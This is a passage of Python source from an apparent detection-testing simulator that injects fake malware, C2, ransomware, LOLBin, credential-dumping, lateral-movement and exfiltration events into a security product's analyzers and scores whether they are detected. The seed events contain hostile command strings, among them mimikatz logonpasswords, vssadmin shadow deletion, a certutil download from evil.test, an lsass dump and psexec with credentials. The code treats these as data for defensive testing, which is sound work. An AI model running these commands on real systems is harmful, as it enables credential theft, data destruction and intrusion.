                "timestamp": datetime.now(timezone.utc).isoformat(),
                "_smith_simulation": True,
            }

    # ------------------------------------------------------------------
    # Attack simulators (mutated — Phase 14)
    # ------------------------------------------------------------------

    async def _simulate_malware_process(self, event_index: int) -> dict:
        """Inject fake malware process entries with mutation."""
        attack_id = f"{self._session_id}-malware-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        base = {
            "name": "mimikatz.exe",
            "pid": 90001,
            "exe": r"C:\Users\attacker\Desktop\mimikatz.exe",
            "cmdline": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
            "parent_name": "cmd.exe",
            "ppid": 4200,
        }

        sample = self._generate_unique_attack("malware_process", base)
        fake_event = {
            **sample,
            "create_time": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_process(fake_event)
        detection = self._check_detection(attack_id, "malware_process", sample.get("name", "unknown"), fake_event)

        return {
            "attack_id": attack_id,
            "category": "malware_process",
            "description": f"Malware process injection: {sample.get('name', 'unknown')}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_c2_beaconing(self, event_index: int) -> dict:
        """Inject fake C2 beaconing connections with mutation."""
        attack_id = f"{self._session_id}-c2-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        base = {
            "remote_addr": "45.33.32.156",
            "remote_port": 4444,
            "local_port": 49300,
            "status": "ESTABLISHED",
            "pid": 91201,
            "name": "cobaltstrike_beacon.exe",
            "bytes_sent": 64,
            "bytes_recv": 2048,
            "beacon_interval_ms": 45000,
            "cmdline": "cobaltstrike beacon.dll /connect 45.33.32.156:4444",
        }

        sample = self._generate_unique_attack("c2_beaconing", base)
        fake_event = {
            **sample,
            "event_type": "network_connection",
            "status": "ESTABLISHED",
            "timestamp": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_connection(fake_event)

        conn_info = f"C2 beaconing to {sample.get('remote_addr', '?')}:{sample.get('remote_port', '?')} interval={sample.get('beacon_interval_ms', 0)}ms"
        rule_event = {
            "name": sample.get("name", ""),
            "cmdline": sample.get("cmdline", ""),
            "details": conn_info,
            "_smith_simulation": True,
        }
        detection = self._check_detection(attack_id, "c2_beaconing", f"C2 beacon to {sample.get('remote_addr', '?')}", rule_event)

        return {
            "attack_id": attack_id,
            "category": "c2_beaconing",
            "description": f"C2 beaconing to {sample.get('remote_addr', '?')}:{sample.get('remote_port', '?')}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_ransomware(self, event_index: int) -> dict:
        """Simulate ransomware behavior in the sandbox with mutation."""
        attack_id = f"{self._session_id}-ransom-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        base = {
            "action": "shadow_delete",
            "description": "Shadow copy deletion via vssadmin",
            "cmdline": "vssadmin delete shadows /all /quiet",
            "details": "Shadow copy deletion simulation",
        }

        sample = self._generate_unique_attack("ransomware", base)

        # Create harmless files in sandbox for mass-rename simulation
        ext = sample.get("ransom_extension", ".encrypted")
        if "mass_rename" in sample.get("details", "") or ext:
            sandbox_sub = self._sandbox_dir / f"ransom_test_{event_index}"
            if self._validate_sandbox_path(str(sandbox_sub)):
                sandbox_sub.mkdir(parents=True, exist_ok=True)
                for i in range(5):
                    dummy = sandbox_sub / f"document_{i}.txt"
                    dummy.write_text(f"Smith simulation file {i}")
                    renamed = sandbox_sub / f"document_{i}.txt{ext}"
                    dummy.rename(renamed)

        fake_event = {
            "name": "ransomware_sim.exe",
            "pid": sample.get("pid", 92001 + event_index),
            "exe": r"C:\Temp\ransomware_sim.exe",
            "cmdline": sample.get("cmdline", ""),
            "details": sample.get("details", ""),
            "event_type": "process_event",
            "timestamp": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        if sample.get("cmdline"):
            self._inject_simulated_process(fake_event)

        detection = self._check_detection(attack_id, "ransomware", sample.get("details", "ransomware"), fake_event)

        return {
            "attack_id": attack_id,
            "category": "ransomware",
            "description": sample.get("details", "Ransomware simulation"),
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_lolbin(self, event_index: int) -> dict:
        """Inject fake LOLBin abuse process entries with mutation."""
        attack_id = f"{self._session_id}-lolbin-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        base = {
            "name": "certutil.exe",
            "pid": 93001,
            "exe": r"C:\Windows\System32\certutil.exe",
            "cmdline": "certutil.exe -urlcache -split -f http://evil.test/payload.exe C:\\Temp\\payload.exe",
        }

        sample = self._generate_unique_attack("lolbin_abuse", base)
        fake_event = {
            **sample,
            "parent_name": "explorer.exe",
            "ppid": 4000,
            "create_time": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_process(fake_event)
        detection = self._check_detection(attack_id, "lolbin_abuse", f"LOLBin abuse: {sample.get('name', '?')}", fake_event)

        return {
            "attack_id": attack_id,
            "category": "lolbin_abuse",
            "description": f"LOLBin abuse via {sample.get('name', '?')}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_credential_dump(self, event_index: int) -> dict:
        """Inject fake credential dumping activity with mutation."""
        attack_id = f"{self._session_id}-cred-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        base = {
            "name": "procdump64.exe",
            "pid": 94001,
            "exe": r"C:\Tools\procdump64.exe",
            "cmdline": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
            "target_process": "lsass.exe",
            "details": "Process dump of lsass.exe",
        }

        sample = self._generate_unique_attack("credential_dump", base)
        fake_event = {
            **sample,
            "parent_name": "cmd.exe",
            "ppid": 5000,
            "create_time": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_process(fake_event)
        detection = self._check_detection(attack_id, "credential_dump", f"Credential dump: {sample.get('name', '?')}", fake_event)

        return {
            "attack_id": attack_id,
            "category": "credential_dump",
            "description": f"Credential dumping via {sample.get('name', '?')}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_lateral_movement(self, event_index: int) -> dict:
        """Inject fake lateral movement activity with mutation."""
        attack_id = f"{self._session_id}-lateral-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        base = {
            "name": "psexec.exe",
            "pid": 95001,
            "exe": r"C:\Tools\PsExec.exe",
            "cmdline": r"psexec.exe \\SERVER01 -u admin -p pass cmd.exe",
            "details": "PsExec remote execution to SERVER01",
            "event_id": 7045,
        }

        sample = self._generate_unique_attack("lateral_movement", base)
        fake_event = {
            **sample,
            "parent_name": "cmd.exe",
            "ppid": 5100,
            "create_time": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_process(fake_event)
        detection = self._check_detection(attack_id, "lateral_movement", f"Lateral movement: {sample.get('name', '?')}", fake_event)

        return {
            "attack_id": attack_id,
            "category": "lateral_movement",
            "description": f"Lateral movement via {sample.get('name', '?')}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_exfiltration(self, event_index: int) -> dict:
        """Inject fake data exfiltration activity with mutation."""
        attack_id = f"{self._session_id}-exfil-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        base = {
            "remote_addr": "203.0.113.42",
            "remote_port": 443,
            "local_port": 50000,
            "status": "ESTABLISHED",
            "pid": 96001,
            "name": "curl.exe",
            "bytes_sent": 75_000_000,
            "event_type": "network_transfer",
            "transfer_size": 75_000_000,
            "cmdline": "",
            "details": "Large outbound data transfer: 75MB to 203.0.113.42",
        }

        sample = self._generate_unique_attack("exfiltration", base)
        fake_event = {
            **sample,
            "status": "ESTABLISHED",
            "event_type": "network_transfer",
            "local_port": random.randint(49152, 65535),
            "timestamp": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_connection(fake_event)
        detection = self._check_detection(attack_id, "exfiltration", f"Exfiltration via {sample.get('name', '?')}", fake_event)

        return {
            "attack_id": attack_id,
            "category": "exfiltration",
            "description": f"Data exfiltration via {sample.get('name', '?')} to {sample.get('remote_addr', '?')}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    # ------------------------------------------------------------------
    # Injection helpers
    # ------------------------------------------------------------------

    def _inject_simulated_process(self, fake_event: dict) -> None:
        """Inject a fake process dict into the process analyzer's simulated list."""
        if self._process_analyzer is None:
            return
        if not hasattr(self._process_analyzer, "_simulated_processes"):
            self._process_analyzer._simulated_processes = []
        self._process_analyzer._simulated_processes.append(fake_event)

    def _inject_simulated_connection(self, fake_event: dict) -> None:
        """Inject a fake connection dict into the network sentinel's simulated list."""
        if self._network_sentinel is None:
            return
        if not hasattr(self._network_sentinel, "_simulated_connections"):
            self._network_sentinel._simulated_connections = []
        self._network_sentinel._simulated_connections.append(fake_event)

    # ------------------------------------------------------------------
    # Detection evaluation
    # ------------------------------------------------------------------

    def _check_detection(self, attack_id: str, category: str, description: str, fake_event: dict) -> dict:
        """Check if Cereberus detected the simulated attack."""
        detected = False
        rule_matches: list[dict] = []

        if self._rule_engine is not None:
            try:
                matches = self._rule_engine.evaluate(fake_event)
                if matches:
                    detected = True
                    rule_matches = [
                        {
                            "rule_id": m.rule_id,
                            "rule_name": m.rule_name,
                            "severity": m.severity,
                            "category": m.category,
                            "explanation": m.explanation,
                        }
                        for m in matches
                    ]
            except Exception as exc:
                logger.error("smith_detection_check_error", error=str(exc), attack_id=attack_id)

        alert_matches: list[dict] = []
        if self._alert_manager is not None:
            try:
                recent = self._alert_manager.get_recent_alerts(limit=20)
                for alert in recent:
                    details = alert.get("details") or {}
                    if details.get("_smith_simulation") or details.get("_smith_attack_id") == attack_id:
                        alert_matches.append({
                            "title": alert.get("title", ""),
                            "severity": alert.get("severity", ""),
                        })
                        detected = True
            except Exception:
                pass

        commentary = _SMITH_QUOTES["detected"] if detected else _SMITH_QUOTES["missed"]

        return {
            "detected": detected,
            "rule_matches": rule_matches,
            "alert_matches": alert_matches,
            "match_count": len(rule_matches) + len(alert_matches),
            "commentary": commentary,
        }

    # ------------------------------------------------------------------
    # Results reporting
    # ------------------------------------------------------------------

    def _generate_results_report(self) -> dict:
        """Compile comprehensive session results report."""
        session_id = self._session_id or "unknown"
        now = datetime.now(timezone.utc).isoformat()

        total_attacks = len(self._current_attacks)
        detected_count = sum(
            1 for a in self._current_attacks
            if a.get("detection", {}).get("detected", False)
        )

        detection_rate = detected_count / total_attacks if total_attacks > 0 else 0.0
        verdict = _verdict(detection_rate)

        category_results: dict[str, dict] = {}
        for attack in self._current_attacks:
            cat = attack.get("category", "unknown")
            if cat not in category_results:
                category_results[cat] = {"total": 0, "detected": 0, "attacks": []}
            category_results[cat]["total"] += 1
            if attack.get("detection", {}).get("detected", False):
                category_results[cat]["detected"] += 1
            category_results[cat]["attacks"].append({
                "attack_id": attack.get("attack_id"),
                "description": attack.get("description"),
                "detected": attack.get("detection", {}).get("detected", False),
                "rule_matches": attack.get("detection", {}).get("rule_matches", []),
            })

        for cat_data in category_results.values():
            cat_total = cat_data["total"]
            cat_data["detection_rate"] = cat_data["detected"] / cat_total if cat_total > 0 else 0.0

        weak_categories = [
            cat for cat, data in category_results.items()
            if data["detection_rate"] < 0.5
        ]
        blind_spots = [
            cat for cat, data in category_results.items()
            if data["detection_rate"] == 0.0 and data["total"] > 0
        ]

        recommendations: list[str] = []
        if "malware_process" in blind_spots:
            recommendations.append("Enable or tune process-based detection rules for known malware families.")
        if "c2_beaconing" in blind_spots:
            recommendations.append("Improve C2 beaconing detection: look for periodic connection patterns and known C2 tool signatures.")
        if "ransomware" in blind_spots:
            recommendations.append("Add ransomware-specific rules: shadow copy deletion, mass file renames, boot recovery disabling.")
        if "lolbin_abuse" in blind_spots:
            recommendations.append("Enhance LOLBin detection coverage: certutil, mshta, regsvr32, rundll32 abuse patterns.")
        if "credential_dump" in blind_spots:
            recommendations.append("Strengthen credential access detection: LSASS access, SAM hive exports, known credential tools.")
        if "lateral_movement" in blind_spots:
            recommendations.append("Improve lateral movement detection: PsExec, WMI remote execution, remote scheduled tasks.")
        if "exfiltration" in blind_spots:
            recommendations.append("Add exfiltration detection: large outbound transfers, DNS tunneling, upload patterns.")
        if not recommendations and detection_rate < 1.0:
            recommendations.append("Consider lowering detection thresholds or adding additional rule coverage for partially-missed categories.")
        if detection_rate >= 1.0:
            recommendations.append("Detection coverage is complete. Consider testing at higher intensity levels for stress testing.")

        elapsed = None
        if self._session_start:
            elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()

        return {
            "session_id": session_id,
            "timestamp": now,
            "intensity": self._intensity,
            "categories_tested": self._session_categories,
            "duration_seconds": elapsed,
            "total_attacks": total_attacks,
            "detected_count": detected_count,
            "missed_count": total_attacks - detected_count,
            "detection_rate": round(detection_rate, 4),
            "verdict": verdict,
            "category_results": category_results,
            "weak_categories": weak_categories,
            "blind_spots": blind_spots,
            "recommendations": recommendations,
            "_smith_simulation": True,
        }

    # ------------------------------------------------------------------
    # Safety invariants
    # ------------------------------------------------------------------

    def _check_invariants(self) -> None:
        """Validate all containment invariants before each attack."""
        if not self._active:
            raise SmithContainmentBreach("Session not active")

        if self._session_start:
            elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()
            if elapsed > self._ABSOLUTE_MAX_DURATION:
                raise SmithContainmentBreach(
                    f"Session exceeded maximum duration: {elapsed:.0f}s > {self._ABSOLUTE_MAX_DURATION}s"
                )

        if self._events_injected >= self._ABSOLUTE_MAX_EVENTS:
            raise SmithContainmentBreach(
                f"Maximum event count reached: {self._events_injected} >= {self._ABSOLUTE_MAX_EVENTS}"
            )

        if not self._sandbox_dir.exists():
            raise SmithContainmentBreach(f"Sandbox directory missing: {self._sandbox_dir}")

    def _validate_sandbox_path(self, path: str) -> bool:
        """Ensure a path is strictly within the sandbox directory."""
        try:
            resolved = Path(path).resolve()
            sandbox_resolved = self._sandbox_dir.resolve()
            return str(resolved).startswith(str(sandbox_resolved))
        except (ValueError, OSError):
            return False

    # ------------------------------------------------------------------
    # Watchdog
    # ------------------------------------------------------------------

    async def _watchdog(self) -> None:
        """Kill session if no progress for WATCHDOG_TIMEOUT seconds."""
        try:
            while self._active:
                await asyncio.sleep(5)

                if not self._active:
                    break

                now = asyncio.get_event_loop().time()
                idle_time = now - self._last_progress

                if idle_time > self._WATCHDOG_TIMEOUT:
                    logger.warning(
                        "smith_watchdog_triggered",
                        idle_seconds=idle_time,
                        session_id=self._session_id,
                    )

                    if self._session_task and not self._session_task.done():
                        self._session_task.cancel()
                        try:
                            await self._session_task
                        except (asyncio.CancelledError, Exception):
                            pass

                    report = self._generate_results_report()
                    await self._cleanup()

                    self._active = False
                    old_session = self._session_id
                    self._session_id = None
                    self._session_start = None
                    self._session_task = None
                    self.health_status = "standby"

                    self._results.appendleft(report)
                    logger.info(
                        "smith_watchdog_killed_session",
                        session_id=old_session,
                        message=_SMITH_QUOTES["watchdog"],
                    )
                    break

                if self._session_start:
                    elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()
                    if elapsed > self._ABSOLUTE_MAX_DURATION:
                        logger.warning("smith_watchdog_timeout", elapsed=elapsed)
                        if self._session_task and not self._session_task.done():
                            self._session_task.cancel()
                            try:
                                await self._session_task
                            except (asyncio.CancelledError, Exception):
                                pass

                        report = self._generate_results_report()
                        await self._cleanup()

                        self._active = False
                        old_session = self._session_id
                        self._session_id = None
                        self._session_start = None
                        self._session_task = None
                        self.health_status = "standby"

                        self._results.appendleft(report)
                        logger.info(
                            "smith_timeout_killed_session",
                            session_id=old_session,
                            message=_SMITH_QUOTES["timeout"],
                        )
                        break

        except asyncio.CancelledError:
            pass

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------

    async def _cleanup(self) -> None:
        """Remove ALL injected data from all modules and clear sandbox."""
        session_id = self._session_id or "cleanup"
        logger.info("smith_cleanup_start", session_id=session_id)

        if self._process_analyzer is not None and hasattr(self._process_analyzer, "_simulated_processes"):
            removed = len(self._process_analyzer._simulated_processes)
            self._process_analyzer._simulated_processes.clear()
            logger.info("smith_cleaned_processes", removed=removed)

        if self._network_sentinel is not None and hasattr(self._network_sentinel, "_simulated_connections"):
            removed = len(self._network_sentinel._simulated_connections)
            self._network_sentinel._simulated_connections.clear()
            logger.info("smith_cleaned_connections", removed=removed)

        if self._sandbox_dir.exists():
            try:
                for item in self._sandbox_dir.iterdir():
                    if item.is_dir():
                        shutil.rmtree(item, ignore_errors=True)
                    elif item.is_file():
                        item.unlink(missing_ok=True)
                logger.info("smith_cleaned_sandbox", path=str(self._sandbox_dir))
            except Exception as exc:
                logger.error("smith_sandbox_cleanup_error", error=str(exc))

        self._current_attacks.clear()
        self._events_injected = 0

        logger.info("smith_cleanup_complete", session_id=session_id)

    # ------------------------------------------------------------------
    # Incident check
    # ------------------------------------------------------------------

    async def _has_active_incidents(self) -> bool:
        """Check if there are active real incidents that should block simulation."""
        if self._incident_manager is None:
            return False

        try:
            for status in ("open", "investigating", "contained"):
                incidents = await self._incident_manager.list_incidents(status=status, limit=1)
                if incidents:
                    return True
        except Exception as exc:
            logger.error("smith_incident_check_error", error=str(exc))
            return True

        return False
